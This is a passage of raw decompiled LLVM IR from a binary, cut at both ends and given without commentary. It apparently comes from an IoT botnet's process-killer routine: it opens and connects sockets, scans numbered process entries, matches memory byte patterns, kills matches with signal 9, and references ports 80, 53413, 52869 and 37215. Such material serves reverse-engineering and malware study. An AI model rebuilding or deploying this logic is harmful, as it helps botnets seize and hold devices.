  br label %dec_label_pc_dab4

dec_label_pc_dab4:                                ; preds = %dec_label_pc_da7c, %dec_label_pc_da98
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_dac0 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  %v7_dac4 = icmp eq i32 %v3_dac0, -1
  store i32 %v3_dac0, i32* @r4, align 4
  br i1 %v7_dac4, label %dec_label_pc_daec, label %dec_label_pc_dad0

dec_label_pc_dad0:                                ; preds = %dec_label_pc_dab4
  store i32 %v2_dad4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_dadc = call i32 @function_12210(i32 %v3_dac0, %sockaddr* %v3_dadc, i32 16)
  %v0_dae0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_dae8 = call i32 @function_122c4(i32 %v0_dae0, i32 1)
  br label %dec_label_pc_daec

dec_label_pc_daec:                                ; preds = %dec_label_pc_dab4, %dec_label_pc_dad0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_daf8 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  %v7_dafc = icmp eq i32 %v3_daf8, -1
  store i32 %v3_daf8, i32* @r4, align 4
  br i1 %v7_dafc, label %dec_label_pc_db24.preheader, label %dec_label_pc_db08

dec_label_pc_db08:                                ; preds = %dec_label_pc_daec
  store i32 %v2_db0c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_db14 = call i32 @function_12210(i32 %v3_daf8, %sockaddr* %v3_db14, i32 16)
  %v0_db18 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_db20 = call i32 @function_122c4(i32 %v0_db18, i32 1)
  br label %dec_label_pc_db24.preheader

dec_label_pc_db24.preheader:                      ; preds = %dec_label_pc_db08, %dec_label_pc_daec
  %v0_db2453 = load i32, i32* @sb, align 4
  %v1_db2854 = inttoptr i32 %v0_db2453 to i32*
  %v2_db2855 = call i32 @function_11ff4(i32* %v1_db2854)
  %v2_db2c57 = icmp eq i32 %v2_db2855, 0
  br i1 %v2_db2c57, label %dec_label_pc_dbb4, label %dec_label_pc_db34.preheader

dec_label_pc_db34.preheader:                      ; preds = %dec_label_pc_db24.preheader, %dec_label_pc_db24.backedge
  %v0_db3466 = phi i32 [ %v2_db28, %dec_label_pc_db24.backedge ], [ %v2_db2855, %dec_label_pc_db24.preheader ]
  %stack_var_-8480.158 = phi i32 [ %stack_var_-8480.1.be, %dec_label_pc_db24.backedge ], [ %stack_var_-8480.0, %dec_label_pc_db24.preheader ]
  br label %dec_label_pc_db34

dec_label_pc_db34:                                ; preds = %dec_label_pc_db34.preheader, %dec_label_pc_db9c
  %v0_db44 = phi i32 [ %v2_dba8, %dec_label_pc_db9c ], [ %v0_db3466, %dec_label_pc_db34.preheader ]
  %stack_var_-8480.2 = phi i32 [ %v1_db58, %dec_label_pc_db9c ], [ %stack_var_-8480.158, %dec_label_pc_db34.preheader ]
  %v1_db34 = add i32 %v0_db44, 11
  %v2_db34 = inttoptr i32 %v1_db34 to i8*
  %v3_db34 = load i8, i8* %v2_db34, align 1
  %v4_db34 = zext i8 %v3_db34 to i32
  %v1_db38 = add nsw i32 %v4_db34, -48
  store i32 %v1_db38, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_db38, 9
  br i1 %tmp, label %dec_label_pc_db24.backedge, label %dec_label_pc_db44

dec_label_pc_db44:                                ; preds = %dec_label_pc_db34
  store i32 %v1_db34, i32* @r6, align 4
  %v2_db4c = call i32 @function_12cbc(i8* %v2_db34)
  %v0_db54 = load i32, i32* @r8, align 4
  %v1_db58 = add i32 %stack_var_-8480.2, 1
  store i32 %v2_db4c, i32* @r7, align 4
  %v5_db64 = icmp slt i32 %v0_db54, %v2_db4c
  %v2_dbc4 = call i32 @function_11dc0(i32* null)
  br i1 %v5_db64, label %dec_label_pc_dbc0, label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %dec_label_pc_db44
  %v0_db70 = load i32, i32* @r5, align 4
  %v2_db70 = sub i32 %v2_dbc4, %v0_db70
  %v7_db78 = icmp slt i32 %v2_db70, 601
  br i1 %v7_db78, label %dec_label_pc_db80, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_db68
  store i32 400, i32* @r8, align 4
  br label %dec_label_pc_db24.backedge

dec_label_pc_db80:                                ; preds = %dec_label_pc_db68
  %v0_db80 = load i32, i32* @r7, align 4
  %v7_db84 = icmp slt i32 %v0_db80, 401
  br i1 %v7_db84, label %dec_label_pc_db24.backedge, label %dec_label_pc_db88

dec_label_pc_db88:                                ; preds = %dec_label_pc_db80
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_db90 = call i32 @function_11878(i32 %v1_db58, i32 10)
  %v2_db94 = icmp eq i32 %v2_db90, 0
  br i1 %v2_db94, label %dec_label_pc_db9c, label %dec_label_pc_db24.backedge

dec_label_pc_db9c:                                ; preds = %dec_label_pc_db88
  %v1_dba0 = call i32 @function_12efc(i32 1)
  %v0_dba4 = load i32, i32* @sb, align 4
  %v1_dba8 = inttoptr i32 %v0_dba4 to i32*
  %v2_dba8 = call i32 @function_11ff4(i32* %v1_dba8)
  %v2_dbac = icmp eq i32 %v2_dba8, 0
  br i1 %v2_dbac, label %dec_label_pc_dbb4, label %dec_label_pc_db34

dec_label_pc_dbb4:                                ; preds = %dec_label_pc_db24.backedge, %dec_label_pc_db9c, %dec_label_pc_db24.preheader
  %stack_var_-8480.3 = phi i32 [ %stack_var_-8480.0, %dec_label_pc_db24.preheader ], [ %v1_db58, %dec_label_pc_db9c ], [ %stack_var_-8480.1.be, %dec_label_pc_db24.backedge ]
  %v0_dbb4 = load i32, i32* @sb, align 4
  %v1_dbb8 = inttoptr i32 %v0_dbb4 to i32*
  %v2_dbb8 = call i32 @function_11e44(i32* %v1_dbb8)
  br label %dec_label_pc_d8bc

dec_label_pc_dbc0:                                ; preds = %dec_label_pc_db44
  store i32 %v2_dbc4, i32* %stack_var_-8484, align 4
  %v1_dbd0 = call i32 @function_10c20(i32 13)
  %v1_dbd8 = call i32 @function_10c20(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_dbe4 = call i32 @function_10b3c(i32 13, i32* null)
  store i32 %v3_dbe4, i32* %r1.global-to-local, align 4
  store i32 %v2_dbf0, i32* @r0, align 4
  %v3_dbf4 = call i32 @function_11214(i8* %v2_dbf4, i32 %v3_dbe4)
  %v2_dc00 = add i32 %v3_dbf4, %v2_dbf0
  store i32 %v2_dc00, i32* %r5.global-to-local, align 4
  store i32 %v2_dc00, i32* @r0, align 4
  %v0_dc08 = load i32, i32* @r6, align 4
  store i32 %v0_dc08, i32* %r1.global-to-local, align 4
  %v2_dc0c = inttoptr i32 %v2_dc00 to i8*
  %v3_dc0c = call i32 @function_11214(i8* %v2_dc0c, i32 %v0_dc08)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_dc1c = call i32 @function_10b3c(i32 14, i32* null)
  store i32 %v3_dc1c, i32* %r1.global-to-local, align 4
  %v0_dc24 = load i32, i32* %r5.global-to-local, align 4
  %v2_dc24 = add i32 %v3_dc0c, %v0_dc24
  store i32 %v2_dc24, i32* @r0, align 4
  %v2_dc28 = inttoptr i32 %v2_dc24 to i8*
  %v3_dc28 = call i32 @function_11214(i8* %v2_dc28, i32 %v3_dc1c)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_dc34 = call i32 @function_10b3c(i32 13, i32* null)
  store i32 %v3_dc34, i32* %r1.global-to-local, align 4
  store i32 %v2_dc40, i32* @r0, align 4
  %v3_dc44 = call i32 @function_11214(i8* %v2_dc44, i32 %v3_dc34)
  store i32 %v2_dc40, i32* %r2.global-to-local, align 4
  %v2_dc50 = add i32 %v3_dc44, %v2_dc40
  store i32 %v2_dc50, i32* @r5, align 4
  %v0_dc54 = load i32, i32* @r6, align 4
  store i32 %v0_dc54, i32* %r1.global-to-local, align 4
  store i32 %v2_dc50, i32* @r0, align 4
  %v2_dc5c = inttoptr i32 %v2_dc50 to i8*
  %v3_dc5c = call i32 @function_11214(i8* %v2_dc5c, i32 %v0_dc54)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_dc5c, i32* @r4, align 4
  %v3_dc6c = call i32 @function_10b3c(i32 29, i32* null)
  store i32 %v3_dc6c, i32* %r1.global-to-local, align 4
  %v0_dc74 = load i32, i32* @r5, align 4
  %v1_dc74 = load i32, i32* @r4, align 4
  %v2_dc74 = add i32 %v1_dc74, %v0_dc74
  store i32 %v2_dc74, i32* @r0, align 4
  %v2_dc78 = inttoptr i32 %v2_dc74 to i8*
  %v3_dc78 = call i32 @function_11214(i8* %v2_dc78, i32 %v3_dc6c)
  %v1_dc80 = call i32 @function_10b68(i32 13)
  %v1_dc88 = call i32 @function_10b68(i32 14)
  store i32 4095, i32* %r2.global-to-local, align 4
  store i32 %v2_d7f0, i32* %r1.global-to-local, align 4
  %v4_dca0 = call i32 @function_11ce4(i8* %v2_dbf4, i32 %v2_d7f0, i32 4095)
  %v7_dca8 = icmp eq i32 %v4_dca0, -1
  store i32 %v4_dca0, i32* @r4, align 4
  store i32 -4344, i32* @r2, align 4
  br i1 %v7_dca8, label %dec_label_pc_dd6c, label %dec_label_pc_dcb8

dec_label_pc_dcb8:                                ; preds = %dec_label_pc_dbc0
  %v2_dcbc = add i32 %v4_dca0, %v28_d760
  store i32 %v2_dcbc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_dcc4 = add i32 %v2_dcbc, -4344
  %v5_dcc4 = inttoptr i32 %v4_dcc4 to i8*
  store i8 0, i8* %v5_dcc4, align 1
  %v1_dccc = call i32 @function_10c20(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_dcd8 = call i32 @function_10b3c(i32 30, i32* null)
  %v0_dcdc = load i32, i32* @r4, align 4
  %v1_dcdc = add i32 %v0_dcdc, -1
  store i32 %v1_dcdc, i32* @r1, align 4
  store i32 %v3_dcd8, i32* %r2.global-to-local, align 4
  %v4_dce8 = call i32 @function_11540(i8* %v2_d7fc, i32 %v1_dcdc, i32 %v3_dcd8)
  %v7_dcec = icmp eq i32 %v4_dce8, -1
  br i1 %v7_dcec, label %dec_label_pc_dd08, label %dec_label_pc_dcf4

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_dcb8
  %v2_dcf8 = call i32 @function_11dec(i8* %v2_d7fc)
  %v0_dcfc = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_dd04 = call i32 @function_11bf0(i32 %v0_dcfc, i32 9)
  br label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dcb8, %dec_label_pc_dcf4
  %v1_dd0c = call i32 @function_10b68(i32 30)
  %v0_dd10 = call i32 @function_11b48()
  %v0_dd14 = load i32, i32* @r7, align 4
  %v9_dd14 = icmp eq i32 %v0_dd14, %v0_dd10
  br i1 %v9_dd14, label %dec_label_pc_dd40, label %dec_label_pc_dd1c

dec_label_pc_dd1c:                                ; preds = %dec_label_pc_dd08
  %v0_dd1c = call i32 @function_11b74()
  %v0_dd20 = load i32, i32* @r7, align 4
  %v9_dd20 = icmp eq i32 %v0_dd20, %v0_dd1c
  br i1 %v9_dd20, label %dec_label_pc_dd40, label %dec_label_pc_dd28

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd1c
  store i32 ptrtoint (i32* @global_var_1cb20.67 to i32), i32* %r2.global-to-local, align 4
  %v2_dd30 = load i32, i32* @global_var_1cb20.67, align 4
  store i32 %v2_dd30, i32* %r1.global-to-local, align 4
  %v4_dd34 = call i32 @function_115cc(i8* %v2_d7fc, i32 %v2_dd30, i32 ptrtoint (i32* @global_var_1cb20.67 to i32))
  %v2_dd38 = icmp eq i32 %v4_dd34, 0
  br i1 %v2_dd38, label %dec_label_pc_dd4c, label %dec_label_pc_dd28.dec_label_pc_dd40_crit_edge

dec_label_pc_dd28.dec_label_pc_dd40_crit_edge:    ; preds = %dec_label_pc_dd28
  %v0_dd44.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_dd40

dec_label_pc_dd40:                                ; preds = %dec_label_pc_dd28.dec_label_pc_dd40_crit_edge, %dec_label_pc_dd1c, %dec_label_pc_dd08
  %v0_dd44 = phi i32 [ %v0_dd44.pre, %dec_label_pc_dd28.dec_label_pc_dd40_crit_edge ], [ %v0_dd1c, %dec_label_pc_dd1c ], [ %v0_dd10, %dec_label_pc_dd08 ]
  %v2_dd40 = load i32, i32* %stack_var_-8484, align 4
  store i32 %v2_dd40, i32* @r5, align 4
  store i32 %v0_dd44, i32* @r8, align 4
  br label %dec_label_pc_db24.backedge

dec_label_pc_db24.backedge:                       ; preds = %dec_label_pc_db88, %dec_label_pc_db80, %dec_label_pc_db34, %dec_label_pc_dd40, %dec_label_pc_de94, %.thread8
  %stack_var_-8480.1.be = phi i32 [ %v1_db58, %dec_label_pc_de94 ], [ %v1_db58, %dec_label_pc_dd40 ], [ %v1_db58, %.thread8 ], [ %stack_var_-8480.2, %dec_label_pc_db34 ], [ %v1_db58, %dec_label_pc_db80 ], [ %v1_db58, %dec_label_pc_db88 ]
  %v0_db24 = load i32, i32* @sb, align 4
  %v1_db28 = inttoptr i32 %v0_db24 to i32*
  %v2_db28 = call i32 @function_11ff4(i32* %v1_db28)
  %v2_db2c = icmp eq i32 %v2_db28, 0
  br i1 %v2_db2c, label %dec_label_pc_dbb4, label %dec_label_pc_db34.preheader

dec_label_pc_dd4c:                                ; preds = %dec_label_pc_dd28
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_dd54 = call i32 @function_11c1c(i8* %v2_d7fc, i32 0)
  %v7_dd58 = icmp eq i32 %v3_dd54, -1
  store i32 %v3_dd54, i32* @r4, align 4
  br i1 %v7_dd58, label %dec_label_pc_df2c, label %dec_label_pc_dd64

dec_label_pc_dd64:                                ; preds = %dec_label_pc_dd4c, %dec_label_pc_df2c
  %v0_dd64 = phi i32 [ %v3_dd54, %dec_label_pc_dd4c ], [ %v0_dd64.pre, %dec_label_pc_df2c ]
  %v1_dd68 = call i32 @function_11af0(i32 %v0_dd64)
  br label %dec_label_pc_dd6c

dec_label_pc_dd6c:                                ; preds = %dec_label_pc_dbc0, %dec_label_pc_dd64
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_dd78 = call i32 @function_11c1c(i8* %v2_dbf4, i32 0)
  %v7_dd7c = icmp eq i32 %v3_dd78, -1
  store i32 %v3_dd78, i32* %r8.global-to-local, align 4
  br i1 %v7_dd7c, label %dec_label_pc_de94, label %dec_label_pc_dd88

dec_label_pc_dd88:                                ; preds = %dec_label_pc_dd6c
  %v1_dd8c = call i32 @function_10c20(i32 18)
  %v1_dd94 = call i32 @function_10c20(i32 19)
  store i32 %v2_dd9c, i32* %r1.global-to-local, align 4
  %v3_dda4 = call i32 @function_10b3c(i32 18, i32* nonnull %stack_var_-40)
  store i32 %v3_dda4, i32* @r5, align 4
  store i32 %v2_ddb0, i32* %r1.global-to-local, align 4
  %v3_ddb8 = call i32 @function_10b3c(i32 19, i32* nonnull %stack_var_-44)
  store i32 %v3_ddb8, i32* @r6, align 4
  br label %dec_label_pc_ddc0

dec_label_pc_ddc0:                                ; preds = %dec_label_pc_de2c, %.thread22, %dec_label_pc_ddf4, %dec_label_pc_dd88
  %v0_ddc0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_d8b4, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_ddcc = call i32 @function_11cb8(i32 %v0_ddc0, i32* nonnull %stack_var_-8476, i32 4096)
  %tmp135 = icmp slt i32 %v4_ddcc, 1
  br i1 %tmp135, label %dec_label_pc_df10, label %dec_label_pc_ddd8

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_ddc0
  store i32 %v2_d9a0, i32* %r3.global-to-local, align 4
  %v3_dddc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_dddc, i32* @r4, align 4
  %v5_dde4 = icmp slt i32 %v4_ddcc, %v3_dddc
  br i1 %v5_dde4, label %dec_label_pc_ddf4, label %dec_label_pc_de48.lr.ph

dec_label_pc_de48.lr.ph:                          ; preds = %dec_label_pc_ddd8
  %v1_de4036 = add i32 %v4_ddcc, -1
  store i32 %v1_de4036, i32* %r1.global-to-local, align 4
  %v0_de48.pre = load i32, i32* @r5, align 4
  %v1_de4c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_de48

dec_label_pc_ddf4:                                ; preds = %dec_label_pc_de40.backedge, %dec_label_pc_ddd8
  %v3_ddf8 = load i32, i32* %stack_var_-44, align 4
  %v5_de00 = icmp slt i32 %v4_ddcc, %v3_ddf8
  br i1 %v5_de00, label %dec_label_pc_ddc0, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_ddf4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_de0c46 = icmp eq i32 %v4_ddcc, 0
  br i1 %v2_de0c46, label %dec_label_pc_ddc0, label %dec_label_pc_de14.lr.ph

dec_label_pc_de14.lr.ph:                          ; preds = %.thread22
  %v0_de14.pre = load i32, i32* @r6, align 4
  %v1_de18.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_de14

dec_label_pc_de14:                                ; preds = %dec_label_pc_de2c, %dec_label_pc_de14.lr.ph
  %v0_de0c.in = phi i32 [ %v4_ddcc, %dec_label_pc_de14.lr.ph ], [ %v0_de0c, %dec_label_pc_de2c ]
  %v0_de2c = phi i32 [ 0, %dec_label_pc_de14.lr.ph ], [ %v1_de2c, %dec_label_pc_de2c ]
  %v0_de20 = phi i32 [ 0, %dec_label_pc_de14.lr.ph ], [ %v1_de20., %dec_label_pc_de2c ]
  %v0_de0c = add i32 %v0_de0c.in, -1
  %v2_de14 = add i32 %v0_de20, %v0_de14.pre
  %v3_de14 = inttoptr i32 %v2_de14 to i8*
  %v4_de14 = load i8, i8* %v3_de14, align 1
  %v6_de14 = zext i8 %v4_de14 to i32
  store i32 %v6_de14, i32* %r2.global-to-local, align 4
  %v2_de18 = add i32 %v0_de2c, %v1_de18.pre
  %v3_de18 = inttoptr i32 %v2_de18 to i8*
  %v4_de18 = load i8, i8* %v3_de18, align 1
  %v6_de18 = zext i8 %v4_de18 to i32
  store i32 %v6_de18, i32* %r3.global-to-local, align 4
  %v9_de1c = icmp eq i8 %v4_de18, %v4_de14
  %v1_de20 = add i32 %v0_de20, 1
  %v1_de20. = select i1 %v9_de1c, i32 %v1_de20, i32 0
  store i32 %v1_de20., i32* %r1.global-to-local, align 4
  br i1 %v9_de1c, label %dec_label_pc_de68, label %dec_label_pc_de2c

dec_label_pc_de2c:                                ; preds = %dec_label_pc_de68, %dec_label_pc_de14
  %v1_de2c = add i32 %v0_de2c, 1
  %v2_de0c = icmp eq i32 %v0_de0c, 0
  br i1 %v2_de0c, label %dec_label_pc_ddc0, label %dec_label_pc_de14

dec_label_pc_de34:                                ; preds = %dec_label_pc_de48
  %v9_de34 = icmp eq i32 %v3_dddc, %v1_de54.
  br i1 %v9_de34, label %dec_label_pc_de70, label %dec_label_pc_de40.backedge

dec_label_pc_de40.backedge:                       ; preds = %dec_label_pc_de48, %dec_label_pc_de34
  %storemerge = add i32 %storemerge.in, 1
  %v1_de40 = add i32 %v0_de40, -1
  store i32 %v1_de40, i32* %r1.global-to-local, align 4
  %v2_de40 = icmp eq i32 %v0_de40, 0
  br i1 %v2_de40, label %dec_label_pc_ddf4, label %dec_label_pc_de48

dec_label_pc_de48:                                ; preds = %dec_label_pc_de40.backedge, %dec_label_pc_de48.lr.ph
  %v0_de40 = phi i32 [ %v1_de4036, %dec_label_pc_de48.lr.ph ], [ %v1_de40, %dec_label_pc_de40.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_de48.lr.ph ], [ %storemerge, %dec_label_pc_de40.backedge ]
  %v0_de54 = phi i32 [ 0, %dec_label_pc_de48.lr.ph ], [ %v1_de54., %dec_label_pc_de40.backedge ]
  %v2_de48 = add i32 %v0_de54, %v0_de48.pre
  %v3_de48 = inttoptr i32 %v2_de48 to i8*
  %v4_de48 = load i8, i8* %v3_de48, align 1
  %v6_de48 = zext i8 %v4_de48 to i32
  store i32 %v6_de48, i32* %r2.global-to-local, align 4
  %v2_de4c = add i32 %storemerge.in, %v1_de4c.pre
  %v3_de4c = inttoptr i32 %v2_de4c to i8*
  %v4_de4c = load i8, i8* %v3_de4c, align 1
  %v6_de4c = zext i8 %v4_de4c to i32
  store i32 %v6_de4c, i32* %r3.global-to-local, align 4
  %v9_de50 = icmp eq i8 %v4_de4c, %v4_de48
  %v1_de54 = add i32 %v0_de54, 1
  %v1_de54. = select i1 %v9_de50, i32 %v1_de54, i32 0
  br i1 %v9_de50, label %dec_label_pc_de34, label %dec_label_pc_de40.backedge

dec_label_pc_de68:                                ; preds = %dec_label_pc_de14
  %v9_de68 = icmp eq i32 %v3_ddf8, %v1_de20.
  br i1 %v9_de68, label %dec_label_pc_de70, label %dec_label_pc_de2c

dec_label_pc_de70:                                ; preds = %dec_label_pc_de34, %dec_label_pc_de68
  %v1_de74 = call i32 @function_10b68(i32 18)
  %v1_de7c = call i32 @function_10b68(i32 19)
  %v0_de80 = load i32, i32* %r8.global-to-local, align 4
  %v1_de84 = call i32 @function_11af0(i32 %v0_de80)
  %v0_de88 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_de90 = call i32 @function_11bf0(i32 %v0_de88, i32 9)
  br label %dec_label_pc_de94

dec_label_pc_de94:                                ; preds = %dec_label_pc_dd6c, %dec_label_pc_df10, %dec_label_pc_de70
  store i32 64, i32* @r1, align 4
  store i32 %v2_dbf0, i32* @r0, align 4
  %v0_dea0 = call i32 @function_1128c()
  store i32 %v2_dc40, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_deb0 = call i32 @function_1128c()
  %v1_deb8 = call i32 @function_12efc(i32 1)
  %v2_debc = load i32, i32* %stack_var_-8484, align 4
  store i32 %v2_debc, i32* @r5, align 4
  %v0_dec0 = load i32, i32* @r7, align 4
  store i32 %v0_dec0, i32* @r8, align 4
  br label %dec_label_pc_db24.backedge

dec_label_pc_dec8:                                ; preds = %dec_label_pc_d9fc
  %v1_ded0 = call i32 @function_d1c4(i32 42448)
  %v2_ded4 = icmp eq i32 %v1_ded0, 0
  br i1 %v2_ded4, label %dec_label_pc_dedc, label %dec_label_pc_da0c

dec_label_pc_dedc:                                ; preds = %dec_label_pc_dec8
  %v1_dee0 = call i32 @function_d1c4(i32 20480)
  %v2_dee4 = icmp eq i32 %v1_dee0, 0
  br i1 %v2_dee4, label %dec_label_pc_deec, label %dec_label_pc_da0c

dec_label_pc_deec:                                ; preds = %dec_label_pc_dedc
  %v1_def4 = call i32 @function_d1c4(i32 34254)
  %v2_def8 = icmp eq i32 %v1_def4, 0
  br i1 %v2_def8, label %dec_label_pc_df00, label %dec_label_pc_da0c

dec_label_pc_df00:                                ; preds = %dec_label_pc_deec
  %v1_df08 = call i32 @function_d1c4(i32 24465)
  br label %dec_label_pc_da0c

dec_label_pc_df10:                                ; preds = %dec_label_pc_ddc0
  %v1_df14 = call i32 @function_10b68(i32 18)
  %v1_df1c = call i32 @function_10b68(i32 19)
  %v0_df20 = load i32, i32* %r8.global-to-local, align 4
  %v1_df24 = call i32 @function_11af0(i32 %v0_df20)
  br label %dec_label_pc_de94

dec_label_pc_df2c:                                ; preds = %dec_label_pc_dd4c
  %v0_df2c = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_df34 = call i32 @function_11bf0(i32 %v0_df2c, i32 9)
  %v0_dd64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dd64

; uselistorder directives
  uselistorder i32 %v1_de54., { 1, 0 }
  uselistorder i1 %v9_de50, { 1, 0 }
  uselistorder i32 %v0_de54, { 1, 0 }
  uselistorder i32 %v1_de20., { 1, 2, 0 }
  uselistorder i1 %v9_de1c, { 1, 0 }
  uselistorder i32 %v0_de20, { 1, 0 }
  uselistorder i32 %v0_de2c, { 1, 0 }
  uselistorder i32 %v3_dd78, { 1, 0 }
  uselistorder i32 %v3_dd54, { 1, 2, 0 }
  uselistorder i32 %v2_db28, { 1, 0 }
  uselistorder i32 %stack_var_-8480.1.be, { 1, 0 }
  uselistorder i32 %v4_dca0, { 1, 2, 0 }
  uselistorder i32 %v2_dba8, { 1, 0 }
  uselistorder i32 %v1_db58, { 0, 1, 5, 4, 3, 2, 7, 6 }
  uselistorder i32 %v3_daf8, { 2, 1, 0 }
  uselistorder i32 %v3_dac0, { 2, 1, 0 }
  uselistorder i32 %v3_da88, { 2, 1, 0 }
  uselistorder i32 %v3_da50, { 2, 1, 0 }
  uselistorder i32 %v3_da18, { 2, 1, 0 }
  uselistorder i32 %v3_d9d0, { 2, 1, 0 }
  uselistorder i32 %stack_var_-8480.0, { 1, 0 }
  uselistorder i32 %v2_dc40, { 1, 0, 2, 3 }
  uselistorder i32 %v2_dbf0, { 1, 0, 2 }
  uselistorder i32 %v4_d880, { 1, 0 }
  uselistorder i32 %v3_d84c, { 2, 0, 1 }
  uselistorder i8* %v2_d7fc, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 %v2_d7f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %storemerge86, { 1, 0 }
  uselistorder i32 %v0_d774, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 19, 20, 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 49, 50, 51, 52, 0, 59, 53, 54, 55, 56, 57, 58, 2, 4, 3, 5, 6, 8, 7, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 36, 37, 1, 39, 40, 41, 42, 44, 43, 45, 46, 47, 48 }
  uselistorder i32 (i32*)* @function_11ff4, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @function_11ef8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_de94, { 1, 2, 0 }
  uselistorder label %dec_label_pc_de70, { 1, 0 }
  uselistorder label %dec_label_pc_dd6c, { 1, 0 }
  uselistorder label %dec_label_pc_dd64, { 1, 0 }
  uselistorder label %dec_label_pc_db24.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_dd08, { 1, 0 }
  uselistorder label %dec_label_pc_db34, { 1, 0 }
  uselistorder label %dec_label_pc_db34.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_daec, { 1, 0 }
  uselistorder label %dec_label_pc_dab4, { 1, 0 }
  uselistorder label %dec_label_pc_da7c, { 1, 0 }
  uselistorder label %dec_label_pc_da44, { 1, 0 }
  uselistorder label %dec_label_pc_da0c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_d9fc, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
}

define i32 @function_df48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_df48:
  store i32 ptrtoint (i32* @global_var_e0d0.70 to i32), i32* @global_var_1c910.72, align 4
  ret i32 %arg1
}

define i32 @function_df60(i32 %arg1) local_unnamed_addr {
dec_label_pc_df60:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_df60 = load i32, i32* @r4, align 4
  %v9_df60 = load i32, i32* @r6, align 4
  %v12_df60 = load i32, i32* @r7, align 4
  %v15_df60 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_df7c = call i32 @function_123e0(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1c908.74 to i32), i32* @r6, align 4
  %v7_df84 = icmp eq i32 %v3_df7c, -1
  store i32 %v3_df7c, i32* @global_var_1c908.74, align 4
  br i1 %v7_df84, label %dec_label_pc_e044, label %dec_label_pc_df90

dec_label_pc_df90:                                ; preds = %dec_label_pc_df60
  %v0_df94 = load i32, i32* @r4, align 4
  %v6_dfa4 = call i32 @function_123b0(i32 %v3_df7c, i32 %v0_df94, i32 2, i32* nonnull %stack_var_-28, i32 4)
  %v2_dfa8 = load i32, i32* @global_var_1c908.74, align 4
  store i32 %v2_dfa8, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_dfb8 = call i32 @function_11a2c(i32 %v2_dfa8, i32 3)
  %v1_dfc0 = or i32 %v2_dfb8, 2048
  store i32 %v1_dfc0, i32* @r2, align 4
  %v0_dfc4 = load i32, i32* @r4, align 4
  %v2_dfc8 = call i32 @function_11a2c(i32 %v0_dfc4, i32 4)
  store i32 ptrtoint (i8** @global_var_1c914.76 to i32), i32* @r8, align 4
  %v2_dfd0 = load i8, i8* bitcast (i8** @global_var_1c914.76 to i8*), align 4
  %v2_dfd4 = icmp eq i8 %v2_dfd0, 0
  br i1 %v2_dfd4, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_df90
  br label %bb

.thread:                                          ; preds = %dec_label_pc_df90
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
